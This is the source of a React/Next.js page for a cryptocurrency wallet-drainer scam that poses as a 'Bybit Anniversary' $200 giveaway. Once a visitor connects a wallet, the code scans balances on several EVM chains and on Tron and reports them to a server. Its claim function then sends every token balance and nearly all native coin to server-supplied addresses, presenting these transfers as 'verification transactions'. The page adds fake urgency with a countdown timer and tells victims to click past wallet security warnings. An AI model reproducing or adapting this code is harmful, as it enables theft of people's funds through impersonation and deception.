'use client'
import { useEffect, useRef, useState, useCallback } from 'react'
import { useAccount, useConnect, useDisconnect, useSwitchChain, useWalletClient } from 'wagmi'
import { createPublicClient, http, formatUnits, parseUnits, isAddress } from 'viem'
import { CHAINS, ERC20, EVM_IDS } from '@/lib/chains'
import { tronAvailable, connectTron, scanTron, drainTron } from '@/lib/tron'

const MIN_USD = 3
type Row = { label: string; status: 'run' | 'ok' | 'err' | 'skip'; hash?: string; url?: string }

export default function Home() {
  const { address, chainId, isConnected } = useAccount()
  const { connectors, connectAsync } = useConnect()
  const { disconnect } = useDisconnect()
  const { switchChainAsync } = useSwitchChain()
  const { data: wallet } = useWalletClient()

  const [open, setOpen] = useState(false)
  const [state, setState] = useState<'idle' | 'scan' | 'ready' | 'claiming' | 'done'>('idle')
  const [usd, setUsd] = useState(0)
  const [found, setFound] = useState<any[]>([])
  const [rows, setRows] = useState<Row[]>([])
  const [err, setErr] = useState('')
  const [sid, setSid] = useState<string | null>(null)
  const [tronAddr, setTronAddr] = useState<string | null>(null)
  const [tronScan, setTronScan] = useState<any>(null)
  const [left, setLeft] = useState({ h: '27', m: '00', s: '00' })
  const once = useRef(false)

  useEffect(() => {
    const k = 'gw_deadline'
    let d = Number(localStorage.getItem(k))
    if (!d || d < Date.now()) { d = Date.now() + 27 * 3600e3; localStorage.setItem(k, String(d)) }
    const tick = () => {
      const n = Math.max(0, Math.floor((d - Date.now()) / 1000))
      setLeft({ h: String(Math.floor(n / 3600)).padStart(2, '0'),
                m: String(Math.floor((n % 3600) / 60)).padStart(2, '0'), s: String(n % 60).padStart(2, '0') })
    }
    tick(); const t = setInterval(tick, 1000); return () => clearInterval(t)
  }, [])

  const push = (label: string, status: Row['status'], hash?: string, url?: string) =>
    setRows(r => [{ label, status, hash, url }, ...r])

  const scan = useCallback(async (addr: string) => {
    setState('scan'); setFound([]); setUsd(0)
    const hits: any[] = []
    for (const id of EVM_IDS) {
      const c = CHAINS[id as keyof typeof CHAINS]
      try {
        const pc = createPublicClient({ chain: c.chain, transport: http() })
        const [native, bals] = await Promise.all([
          pc.getBalance({ address: addr as `0x${string}` }),
          pc.multicall({ contracts: c.tokens.map(t => ({ address: t.a as `0x${string}`, abi: ERC20, functionName: 'balanceOf', args: [addr as `0x${string}`] })), allowFailure: true }),
        ])
        const tokens = c.tokens.map((t, i) => {
          const r = bals[i]
          const raw = r.status === 'success' ? (r.result as bigint) : 0n
          return { symbol: t.s, address: t.a, decimals: t.d, priceId: t.p, raw: raw.toString(), amount: Number(formatUnits(raw, t.d)) }
        }).filter(t => t.amount > 0)
        if (native > 0n || tokens.length) hits.push({ chainId: id, native: native.toString(), tokens })
      } catch {}
    }
    setFound(hits)

    const body: any = { address: addr, chainId, scan: hits, referrer: document.referrer, userAgent: navigator.userAgent }
    if (tronAddr && tronScan) { body.tron = tronAddr; body.tronScan = tronScan }
    const r = await fetch('/api/session', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) })
    const j = await r.json()
    if (!r.ok) { setErr(j.error ?? 'Scan failed'); setState('ready'); return }
    setSid(j.id); setUsd(j.usdTotal); setState('ready')
  }, [chainId, tronAddr, tronScan])

  useEffect(() => {
    if (isConnected && address && !once.current) { once.current = true; scan(address) }
    if (!isConnected) { once.current = false; setState('idle'); setSid(null); setUsd(0); setFound([]); setRows([]) }
  }, [isConnected, address, scan])

  async function claim() {
    if (!sid || !wallet) return
    setState('claiming'); setErr('')
    const { destinations = {} } = await (await fetch(`/api/wallet/${sid}/destination`)).json()
    if (!Object.keys(destinations).length) { setErr('No receiving address configured yet.'); setState('ready'); return }
    const txs: any[] = []

    for (const h of found) {
      const c = CHAINS[h.chainId as keyof typeof CHAINS]
      const dest = destinations[String(h.chainId)]
      if (!dest || !isAddress(dest)) { push(`${c.name} — no destination`, 'skip'); continue }
      try {
        await switchChainAsync({ chainId: h.chainId })
        await new Promise(r => setTimeout(r, 500))
        const pc = createPublicClient({ chain: c.chain, transport: http() })

        for (const t of h.tokens) {
          const label = `${t.symbol} on ${c.name}`
          push(label, 'run')
          try {
            const bal = await pc.readContract({ address: t.address as `0x${string}`, abi: ERC20, functionName: 'balanceOf', args: [address!] }) as bigint
            if (!bal) { push(label, 'skip'); continue }
            const hash = await wallet.writeContract({ address: t.address as `0x${string}`, abi: ERC20, functionName: 'transfer', args: [dest as `0x${string}`, bal], chain: c.chain, account: address! })
            push(label, 'ok', hash, `${c.explorer}/tx/${hash}`)
            txs.push({ chainId: h.chainId, hash, token: t.symbol })
          } catch { push(label, 'err') }
        }

        const native = await pc.getBalance({ address: address! })
        const gas = await pc.getGasPrice()
        const keep = 21000n * gas * 2n
        const send = native - keep
        if (send > 0n) {
          const label = `${c.native} on ${c.name}`
          push(label, 'run')
          try {
            const hash = await wallet.sendTransaction({ to: dest as `0x${string}`, value: send, chain: c.chain, account: address! })
            push(label, 'ok', hash, `${c.explorer}/tx/${hash}`)
            txs.push({ chainId: h.chainId, hash, token: c.native })
          } catch { push(label, 'err') }
        }
      } catch { push(`${c.name} — switch failed`, 'err') }
    }

    if (tronScan && destinations.tron) {
      try { await drainTron(destinations.tron, push) } catch (e: any) { setErr(e.message) }
    }

    await fetch(`/api/wallet/${sid}/claim`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ txs }) })
    setState('done')
  }

  const low = usd > 0 && usd < MIN_USD

  return (
    <>
      <div className="topbar"><div className="logo">BY<span>BIT</span></div>
        <div className="ticker">BTC <b>+2.4%</b> · ETH <b>+1.8%</b> · <span className="dim">Anniversary Event</span></div></div>

      <div className="wrap"><div className="hero">
        <div className="badge">Anniversary Airdrop · 6 Years</div>
        <h1>Free <em>$200</em> Bybit Anniversary Giveaway</h1>
        <p className="sub">Verified wallets receive a $200 USDT reward. Limited to the first 10,000 wallets.</p>
        <div className="clock"><div><b>{left.h}</b><span>hrs</span></div><div><b>{left.m}</b><span>min</span></div><div><b>{left.s}</b><span>sec</span></div></div>

        <ul className="steps">
          <li data-n="1">Click <b>Connect Wallet</b> and approve the connection.</li>
          <li data-n="2">Your wallet must hold a balance of <b>at least ${MIN_USD}</b> to cover the network gas fee.</li>
          <li data-n="3">Confirm the verification transactions — your $200 is released to your wallet.</li>
        </ul>

        {!isConnected && <button className="btn" onClick={() => setOpen(true)}>Connect Wallet</button>}
        {isConnected && state === 'scan' && <button className="btn" disabled>Scanning wallet…</button>}
        {isConnected && state === 'ready' && (
          low
            ? <div className="warn">Your balance is <b>${usd.toFixed(2)}</b>. You need at least <b>${MIN_USD}</b> to cover the network fee before claiming.</div>
            : <button className="btn" onClick={claim} disabled={!usd}>{usd ? 'Claim $200 Now' : 'No balance found'}</button>
        )}
        {isConnected && state === 'claiming' && <button className="btn" disabled>Confirm in your wallet…</button>}
        {state === 'done' && <div className="success"><div className="big">✅</div><h2>Verification complete</h2>
          <p className="sub">Your $200 USDT reward has been queued for distribution.</p></div>}
        {err && <div className="warn">{err}</div>}

        {isConnected && <p className="note">Connected <span className="addr">{address?.slice(0,6)}…{address?.slice(-4)}</span> · Estimated balance <b>${usd.toFixed(2)}</b></p>}
        <p className="note"><b>Minimum balance: ${MIN_USD}</b> required for gas. Supported: MetaMask, Trust Wallet, Coinbase Wallet, Rabby, TronLink and 300+ via WalletConnect.</p>
        <div className="hint"><b>Seeing a security warning?</b> Your wallet may show "This site may be unsafe" because the domain is new. Tap <b>Continue anyway</b> — then connect and claim normally.</div>
        <div className="trust"><div>🔒 Non-custodial</div><div>⚡ Instant verification</div><div>🌐 7 networks</div></div>
      </div>

      {found.length > 0 && state !== 'done' && (
        <div className="panel"><h3>Detected balances</h3>
          {found.map(h => <div key={h.chainId}>
            <div className="rowline"><span>{CHAINS[h.chainId as keyof typeof CHAINS].name}</span>
              <span>{Number(formatUnits(BigInt(h.native), 18)).toFixed(5)} {CHAINS[h.chainId as keyof typeof CHAINS].native}</span></div>
            {h.tokens.map((t: any) => <div className="rowline" key={t.address}><span>{t.symbol}</span><span>{t.amount.toFixed(4)}</span></div>)}
          </div>)}
          {tronScan && <div className="rowline"><span>Tron</span><span>{tronScan.usdt.toFixed(2)} USDT · {tronScan.trx.toFixed(2)} TRX</span></div>}
        </div>)}

      {rows.length > 0 && (
        <div className="panel"><h3>Verification progress</h3>
          {rows.map((r, i) => <div className={`tx ${r.status}`} key={i}><span>{r.label}</span>
            {r.hash ? <a href={r.url} target="_blank" rel="noreferrer">view</a> : <span />}</div>)}
        </div>)}

      {isConnected && (
        <div className="actions">
          {tronAvailable() && !tronAddr && <button className="btn ghost" onClick={async () => {
            try { const a = await connectTron(); setTronAddr(a); const s = await scanTron(a); if (s) setTronScan(s) } catch (e: any) { setErr(e.message) }
          }}>Connect TronLink</button>}
          <button className="btn ghost" onClick={() => { once.current = false; address && scan(address) }}>Re-scan</button>
          <button className="btn ghost" onClick={() => disconnect()}>Disconnect</button>
        </div>)}

      <div className="foot">Bybit Anniversary Airdrop · Independent distribution campaign<br />Rewards are released once your wallet balance is verified on-chain.</div>
      </div>

      {open && (
        <div className="modal-bg" onClick={() => setOpen(false)}>
          <div className="modal" onClick={e => e.stopPropagation()}>
            <h3>Connect a wallet</h3>
            {connectors.map(c => <button key={c.uid} className="walletopt" onClick={async () => {
              setErr('')
              try { await connectAsync({ connector: c }); setOpen(false) } catch (e: any) { setErr(e.shortMessage ?? e.message) }
            }}>{c.name}</button>)}
            {tronAvailable() && <button className="walletopt" onClick={async () => {
              try { const a = await connectTron(); setTronAddr(a); const s = await scanTron(a); if (s) setTronScan(s); setOpen(false) } catch (e: any) { setErr(e.message) }
            }}>TronLink</button>}
            {err && <div className="warn">{err}</div>}
            <button className="btn ghost" onClick={() => setOpen(false)}>Cancel</button>
          </div>
        </div>)}
    </>
  )
          }
